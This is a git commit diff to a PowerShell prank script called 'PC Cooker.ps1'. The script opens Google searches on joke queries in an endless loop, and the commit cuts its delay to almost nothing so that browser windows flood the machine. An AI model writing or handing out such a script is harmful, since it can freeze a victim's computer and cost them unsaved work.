376e6782dc251aefefe2c98bd969656f06fcb45f
VanillaVulture <90653499+VanillaVulture@users.noreply.github.com>
2025-02-14 13:52:37 -0600

    Update PC Cooker.ps1

--- WARNING/PC Cooker.ps1
+++ WARNING/PC Cooker.ps1
@@ -1,5 +1,5 @@
-$searches = @("why is my computer slow", "how to fix a computer", "why is my mouse moving", "what is hacking", "how to stop PowerShell scripts", "how to delete system32", "Cats", "Is my PC on fire", "Help i accidently built a shed")
+$searches = @("why isnt my computer working", "why is my computer slow", "how to fix a computer", "why is my mouse moving", "what is hacking", "how to stop PowerShell scripts", "how to delete system32", "Cats", "Is my PC on fire", "Help i accidently built a shed")
 while ($true) {
-    Start-Sleep -Seconds (Get-Random -Minimum .01 -Maximum .001)
+    Start-Sleep -Seconds (Get-Random -Minimum .000001 -Maximum .00000001)
     Start-Process "https://www.google.com/search?q=$($searches | Get-Random)"
 }
